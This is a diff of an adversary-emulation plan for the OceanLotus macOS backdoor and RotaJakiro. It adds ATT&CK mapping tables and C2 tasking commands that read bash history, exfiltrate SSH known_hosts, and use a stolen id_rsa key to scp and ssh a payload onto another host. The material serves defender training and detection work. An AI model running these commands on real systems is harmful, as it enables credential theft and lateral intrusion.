@@ -166,9 +166,9 @@ Open a new terminal window on your local machine.
 ## Step 1 - Establish Foothold
 ### 📖 Overview
 
-👋 Handwaving: Assume the user downloaded the conkylan.app (unicorn in Vietnamese) and it  resides on the user's `Downloads` folder. 
+👋 Handwaving: Assume the user downloaded the conkylan.app (unicorn in Vietnamese) and it resides on the user's `Downloads` folder. 
 
-The user double-clicks the conkylan.app (note: We were not able to implement the homoglyph file extension due to updates from by apple 🙌 🍎) thinking it's a normal document. 
+The user double-clicks the conkylan.app (note: We were not able to implement the homoglyph file extension due to OS updates 🙌 🍎) thinking it's a normal document. 
 
 The implant opens a decoy word document while establishing a connection with the C2 server. 
 
@@ -255,6 +255,37 @@ Note: As a result of our decision to hardcode the implant UUIDs to enable the co
 
 
 ### 🔮 Reference Code & Reporting
+<details>
+   <summary>Click to expand table</summary>
+
+   | Red Team Activity | Source Code Link | ATT&CK Technique | Relevant CTI Report |
+   | ----------------- | ---------------- | ---------------- | ------------------- |
+   | Legitimate user opens conkylan.app | - | T1204.002 User Execution: Malicious File | https://unit42.paloaltonetworks.com/unit42-new-improved-macos-backdoor-oceanlotus/<br><br>https://www.trendmicro.com/en_us/research/20/k/new-macos-backdoor-connected-to-oceanlotus-surfaces.html | 
+   | conkylan.app masquerades as a Word document | [Application bundle build script](../Resources/OSX.OceanLotus/ApplicationBundle/build_bundle.sh) | T1036.008 Masquerading: Masquerade File Type | https://unit42.paloaltonetworks.com/unit42-new-improved-macos-backdoor-oceanlotus/<br><br>https://www.trendmicro.com/en_us/research/20/k/new-macos-backdoor-connected-to-oceanlotus-surfaces.html |
+   | conkylan.app executes a shell script | [First stage script](../Resources/OSX.OceanLotus/ApplicationBundle/first_stage.sh) | T1059.004 Command and Scripting Interpreter: Unix Shell | https://www.trendmicro.com/en_us/research/20/k/new-macos-backdoor-connected-to-oceanlotus-surfaces.html |
+   | Application bundle shell script removes the quarantine flag on the application bundle contents | [Script removes quarantine flag](..Resources/OSX.OceanLotus/ApplicationBundle/first_stage.sh#L50-L53) | T1222.002 File and Directory Permissions Modification: Linux and Mac File and Directory Permissions Modification | https://www.trendmicro.com/en_us/research/20/k/new-macos-backdoor-connected-to-oceanlotus-surfaces.html |
+   | Application bundle shell script adds a Launch Agent configuration | [Script copies Launch Agent plist configuration to user's LaunchAgents](../Resources/OSX.OceanLotus/ApplicationBundle/first_stage.sh#L68-L83) | T1543.001 Create or Modify System Process: Launch Agent | https://unit42.paloaltonetworks.com/unit42-new-improved-macos-backdoor-oceanlotus/<br><br>https://www.trendmicro.com/en_us/research/20/k/new-macos-backdoor-connected-to-oceanlotus-surfaces.html<br><br>https://www.trendmicro.com/en_us/research/18/d/new-macos-backdoor-linked-to-oceanlotus-found.html |
+   | Application bundle shell script drops Communication dylib and implant binary | [Script echos and writes the base64 decoded payload to disk](../Resources/OSX.OceanLotus/ApplicationBundle/first_stage.sh#L85-L90) | - | https://www.trendmicro.com/en_us/research/20/k/new-macos-backdoor-connected-to-oceanlotus-surfaces.html |
+   | Application bundle shell script executes `touch`` | [Script modifies file timestamps](../Resources/OSX.OceanLotus/ApplicationBundle/first_stage.sh#L92-L98) | T1070.006 Indicator Removal: Timestomp | https://www.trendmicro.com/en_us/research/20/k/new-macos-backdoor-connected-to-oceanlotus-surfaces.html |
+   | Application bundle shell script adds executable bit to dropped implant binary | [Script makes implant binary executable](../Resources/OSX.OceanLotus/ApplicationBundle/first_stage.sh#L50-L53) | T1222.002 File and Directory Permissions Modification: Linux and Mac File and Directory Permissions Modification | https://www.trendmicro.com/en_us/research/20/k/new-macos-backdoor-connected-to-oceanlotus-surfaces.html |
+   | Application bundle shell script deletes application bundle, replacing it with a decoy document | [Script deletes application bundle](../Resources/OSX.OceanLotus/ApplicationBundle/first_stage.sh#L101) | T1070 Indicator Removal: File Deletion | https://unit42.paloaltonetworks.com/unit42-new-improved-macos-backdoor-oceanlotus/<br><br>https://www.trendmicro.com/en_us/research/20/k/new-macos-backdoor-connected-to-oceanlotus-surfaces.html |
+   | OSX.OceanLotus loads the dropped Communication dylib | [`loadComms`](../Resources/OSX.OceanLotus/Implant/Implant/main.cpp#L40-L99) | - | https://www.welivesecurity.com/2019/04/09/oceanlotus-macos-malware-update/ |
+   | OSX.OceanLotus implant leverages API calls from IOKit | [Calls to IOKit APIs](../Resources/OSX.OceanLotus/Implant/Implant/ClientPP.cpp#L35-L50) | T1106 Native API | |
+   | OSX.OceanLotus implant retrieves IOPlatformSerialNumber| [Get IOPlatformSerialNumber](../Resources/OSX.OceanLotus/Implant/Implant/ClientPP.cpp#L302) | T1082 System Information Discovery | https://www.welivesecurity.com/2019/04/09/oceanlotus-macos-malware-update/<br><br>https://www.trendmicro.com/en_us/research/20/k/new-macos-backdoor-connected-to-oceanlotus-surfaces.html |
+   | OSX.OceanLotus implant retrieves IOPlatformUUID| [Get IOPlatformSerialNumber](../Resources/OSX.OceanLotus/Implant/Implant/ClientPP.cpp#L305) | T1082 System Information Discovery | https://www.welivesecurity.com/2019/04/09/oceanlotus-macos-malware-update/<br><br>https://www.trendmicro.com/en_us/research/20/k/new-macos-backdoor-connected-to-oceanlotus-surfaces.html |
+   | OSX.OceanLotus leverages popen to executes shell commands | [`executeCmd`](../Resources/OSX.OceanLotus/Implant/Implant/ClientPP.cpp#L8-L29) | T1059.004 Command and Scripting Interpreter: Unix Shell | https://unit42.paloaltonetworks.com/unit42-new-improved-macos-backdoor-oceanlotus/ |
+   | OSX.OceanLotus implant retrieves MAC address from ifconfig | [Execute ifconfig](../Resources/OSX.OceanLotus/Implant/Implant/ClientPP.cpp#L308-L309) | T1016 System Network Configuration Discovery | https://www.trendmicro.com/en_us/research/18/d/new-macos-backdoor-linked-to-oceanlotus-found.html<br?https://www.welivesecurity.com/2019/04/09/oceanlotus-macos-malware-update/<br><br>https://www.trendmicro.com/en_us/research/20/k/new-macos-backdoor-connected-to-oceanlotus-surfaces.html |
+   | OSX.OceanLotus implant retrieves current system time | [Populate implant install time](../Resources/OSX.OceanLotus/Implant/Implant/ClientPP.cpp#L132) | T1124 System Time Discovery | https://www.trendmicro.com/en_us/research/18/d/new-macos-backdoor-linked-to-oceanlotus-found.html |
+   | OSX.OceanLotus implant leverages `getpwuid` to discover username | [`getpwuid`](../Resources/OSX.OceanLotus/Implant/Implant/ClientPP.cpp#L137-L142) | T1033 System Owner/User Discovery | https://unit42.paloaltonetworks.com/unit42-new-improved-macos-backdoor-oceanlotus/ |
+   | OSX.OceanLotus implant leverages `SCDynamicStoreCopyComputerName` to discover computer name | [`getComputerName`](../Resources/OSX.OceanLotus/Implant/Implant/ClientPP.cpp#L94-L103) | T1082 System Information Discovery | https://www.trendmicro.com/en_us/research/18/d/new-macos-backdoor-linked-to-oceanlotus-found.html |
+   | OSX.OceanLotus implant leverages `uname` to discover the hardware name | [`getHardwareName`](../Resources/OSX.OceanLotus/Implant/Implant/ClientPP.cpp#L105-L113) | T1082 System Information Discovery | https://www.trendmicro.com/en_us/research/18/d/new-macos-backdoor-linked-to-oceanlotus-found.html |
+   | OSX.OceanLotus implant discovers domain name | [`klist`](../Resources/OSX.OceanLotus/Implant/Implant/ClientPP.cpp#L150-L152) | T1016 System Network Configuration Discovery | https://www.trendmicro.com/en_us/research/18/d/new-macos-backdoor-linked-to-oceanlotus-found.html<br>**NOTE:** Figure 10 reports the `HandlePP` class having a variable named `domain` |
+   | OSX.OceanLotus implant discovers software product version | [Execute `sw_vers`](../Resources/OSX.OceanLotus/Implant/Implant/ClientPP.cpp#L154-L155) | T1082 System Information Discovery | https://www.trendmicro.com/en_us/research/18/d/new-macos-backdoor-linked-to-oceanlotus-found.html |
+   | OSX.OceanLotus implants discovers system hardware information | [Execute `system_profiler SPHardwareDataType`](../Resources/OSX.OceanLotus/Implant/Implant/ClientPP.cpp#L157-L160) | T1082 System Information Discovery | https://www.trendmicro.com/en_us/research/20/k/new-macos-backdoor-connected-to-oceanlotus-surfaces.html<br><br>https://www.welivesecurity.com/2019/04/09/oceanlotus-macos-malware-update/ |
+   | OSX.OceanLotus sends an HTTP POST request with the discovered OS info to register with the C2 server via call to exported function from Communication dylib | [Send `POST` with discovered OS info](../Resources/OSX.OceanLotus/Implant/Implant/ClientPP.cpp#L168)<br><br>[Communication library exported `sendRequest`](../Resources/OSX.OceanLotus/Comms/Comms/Comms.cpp#L89-L174) | T1071.001 Application Layer Protocol: Web Protocols | https://www.trendmicro.com/en_us/research/18/d/new-macos-backdoor-linked-to-oceanlotus-found.html<br><br>https://www.trendmicro.com/en_us/research/20/k/new-macos-backdoor-connected-to-oceanlotus-surfaces.html |
+   | OSX.OceanLotus sends an HTTP GET request to heartbeat with the C2 server via call to exported function from Communication dylib | [Send `GET` with discovered OS info](../Resources/OSX.OceanLotus/Implant/Implant/ClientPP.cpp#L189)<br><br>[Communication library exported `sendRequest`](../Resources/OSX.OceanLotus/Comms/Comms/Comms.cpp#L89-L174) | T1071.001 Application Layer Protocol: Web Protocols | https://www.trendmicro.com/en_us/research/18/d/new-macos-backdoor-linked-to-oceanlotus-found.html<br><br>https://www.trendmicro.com/en_us/research/20/k/new-macos-backdoor-connected-to-oceanlotus-surfaces.html |
+
+ </details>
 <br>
 
 ### 🔬 Blue Team Notes
@@ -340,6 +371,20 @@ Note: As a result of our decision to hardcode the implant UUIDs to enable the co
    Reviewing the history file, we see they often run admin and file managment commands to a linux server. 
 
 ### 🔮 Reference Code & Reporting
+<details>
+   <summary>Click to expand table</summary>
+
+   | Red Team Activity | Source Code Link | ATT&CK Technique | Relevant CTI Report |
+   | ----------------- | ---------------- | ---------------- | ------------------- |
+   | OSX.OceanLotus implant leverages popen to execute shell commands | [Execute command instruction `0xAC`](../Resources/OSX.OceanLotus/Implant/Implant/ClientPP.cpp#L240-L253)<br><br>[`executeCmd`](../Resources/OSX.OceanLotus/Implant/Implant/ClientPP.cpp#L8-L29) | T1059.004 Command and Scripting Interpreter: Unix Shell | https://www.trendmicro.com/en_us/research/18/d/new-macos-backdoor-linked-to-oceanlotus-found.html<br><br>https://www.trendmicro.com/en_us/research/20/k/new-macos-backdoor-connected-to-oceanlotus-surfaces.html<br><br>https://unit42.paloaltonetworks.com/unit42-new-improved-macos-backdoor-oceanlotus/ |
+   | OSX.OceanLotus implant returns command output via HTTP POST request to the C2 server | [Send `POST` with command output](../Resources/OSX.OceanLotus/Implant/Implant/ClientPP.cpp#L252)<br><br>[Communication library exported `sendRequest`](../Resources/OSX.OceanLotus/Comms/Comms/Comms.cpp#L89-L174) | T1071.001 Application Layer Protocol: Web Protocols | https://www.trendmicro.com/en_us/research/18/d/new-macos-backdoor-linked-to-oceanlotus-found.html<br><br>https://www.trendmicro.com/en_us/research/20/k/new-macos-backdoor-connected-to-oceanlotus-surfaces.html |
+   | OSX.OceanLotus implant executes `ls -la /Users/hpotter/.ssh/` | [Execute command instruction `0xAC`](../Resources/OSX.OceanLotus/Implant/Implant/ClientPP.cpp#L240-L253)<br><br>[`executeCmd`](../Resources/OSX.OceanLotus/Implant/Implant/ClientPP.cpp#L8-L29) | T1083 File and Directory Discovery | - |
+   | OSX.OceanLotus implant exfiltrates `/Users/hpotter/.ssh/known_hosts` via HTTP POST request | [Upload instruction `0x72`](../Resources/OSX.OceanLotus/Implant/Implant/ClientPP.cpp#L217-L230)<br><br>[`readFile`](../Resources/OSX.OceanLotus/Implant/Implant/ClientPP.cpp#L68-L82) | T1041 Exfiltration Over C2 Channel | - |
+   | OSX.OceanLotus implant executes `cat /Users/hpotter/.bash_history` | [Execute command instruction `0xAC`](../Resources/OSX.OceanLotus/Implant/Implant/ClientPP.cpp#L240-L253)<br><br>[`executeCmd`](../Resources/OSX.OceanLotus/Implant/Implant/ClientPP.cpp#L8-L29) | T1552.003 Unsecured Credentials: Bash History | - |
+
+   </summary>
+</details>
+
 <br>
 
 ### 🔬 Blue Team Notes
@@ -360,7 +405,7 @@ Task OceanLotus to download Rota Jakiro to the macOS Host
 ./evalsC2client.py --set-task <OSX.OceanLotus ID> '{"cmd":"OSX_download_file", "payload":"rota"}'
 ```
 
-Veify the file downloaded
+Verify the file downloaded
 ```./evalsC2client.py --set-task b6dbd70f203515095d0ca8a5ecbb43f7 '{"cmd":"OSX_run_cmd", "arg":"ls -la /Users/hpotter/Library/WebKit/osx.download"}'
 ```
 
@@ -393,6 +438,20 @@ Use OceanLotus to Execute Rota Jakiro on the Lotus host using ssh
 Confirm C2 Registration of Rota on the C2 Server
 
 ### 🔮 Reference Code & Reporting
+<details>
+   <summary>Click to expand table</summary>
+
+   | Red Team Activity | Source Code Link | ATT&CK Technique | Relevant CTI Report |
+   | ----------------- | ---------------- | ---------------- | ------------------- |
+   | OSX.OceanLotus implant downloads RotaJakiro as `osx.download` | [Download instruction `0x23` or `0x3C`](../Resources/OSX.OceanLotus/Implant/Implant/ClientPP.cpp#L231-L239)<br><br>[writeFile](../Resources/OSX.OceanLotus/Implant/Implant/ClientPP.cpp#L55-L66) | T1105 Ingress Tool Transfer | https://www.trendmicro.com/en_us/research/18/d/new-macos-backdoor-linked-to-oceanlotus-found.html<br><br>https://www.trendmicro.com/en_us/research/20/k/new-macos-backdoor-connected-to-oceanlotus-surfaces.html |
+   | OSX.OceanLotus implant leverages popen to execute shell commands | [Execute command instruction `0xAC`](../Resources/OSX.OceanLotus/Implant/Implant/ClientPP.cpp#L240-L253)<br><br>[`executeCmd`](../Resources/OSX.OceanLotus/Implant/Implant/ClientPP.cpp#L8-L29) | T1059.004 Command and Scripting Interpreter: Unix Shell | https://www.trendmicro.com/en_us/research/18/d/new-macos-backdoor-linked-to-oceanlotus-found.html<br><br>https://www.trendmicro.com/en_us/research/20/k/new-macos-backdoor-connected-to-oceanlotus-surfaces.html<br><br>https://unit42.paloaltonetworks.com/unit42-new-improved-macos-backdoor-oceanlotus/ |
+   | OSX.OceanLotus implant executes `ls -la /Users/hpotter/Library/WebKit/osx.download` | [Execute command instruction `0xAC`](../Resources/OSX.OceanLotus/Implant/Implant/ClientPP.cpp#L240-L253)<br><br>[`executeCmd`](../Resources/OSX.OceanLotus/Implant/Implant/ClientPP.cpp#L8-L29) | T1083 File and Directory Discovery | - |
+   | OSX.OceanLotus implant returns command output via HTTP POST request to the C2 server | [Send `POST` with command output](../Resources/OSX.OceanLotus/Implant/Implant/ClientPP.cpp#L252)<br><br>[Communication library exported `sendRequest`](../Resources/OSX.OceanLotus/Comms/Comms/Comms.cpp#L89-L174) | T1071.001 Application Layer Protocol: Web Protocols | https://www.trendmicro.com/en_us/research/18/d/new-macos-backdoor-linked-to-oceanlotus-found.html<br><br>https://www.trendmicro.com/en_us/research/20/k/new-macos-backdoor-connected-to-oceanlotus-surfaces.html |
+   | OSX.OceanLotus implant executes `scp -i /Users/hpotter/.ssh/id_rsa /tmp/rota hpotter@viserion.com@10.90.30.7:/tmp/rota` | [Execute command instruction `0xAC`](../Resources/OSX.OceanLotus/Implant/Implant/ClientPP.cpp#L240-L253)<br><br>[`executeCmd`](../Resources/OSX.OceanLotus/Implant/Implant/ClientPP.cpp#L8-L29) | T1570 Lateral Tool Transfer | - |
+   | OSX.OceanLotus implant executes `ssh -i /Users/hpotter/.ssh/id_rsa -t hpotter@viserion.com@10.90.30.7 \"nohup /tmp/rota&; sleep 5; pkill rota\"` | [Execute command instruction `0xAC`](../Resources/OSX.OceanLotus/Implant/Implant/ClientPP.cpp#L240-L253)<br><br>[`executeCmd`](../Resources/OSX.OceanLotus/Implant/Implant/ClientPP.cpp#L8-L29) | T1021.004 Remote Services: SSH | - |
+
+   </summary>
+</details>
 <br>
 
 ### 🔬 Blue Team Notes
@@ -406,7 +465,9 @@ Upload device info
 
 ---
 ### 👾 Red Team Procedures
-`./evalsC2client.py --set-task b6dbd70f203515095d0ca8a5ecbb43f7 '{"cmd":"OSX_run_cmd", "arg":"ssh -i /Users/hpotter/.ssh/id_rsa -t hpotter@viserion.com@10.90.30.7 \"nohup /tmp/rota&; sleep 5; pkill rota\""}'`
+```
+./evalsC2client.py --set-task 01020304 '{"cmd": "Rota_upload_dev_info"}'
+```
 
 Confirm device info is printed out
 
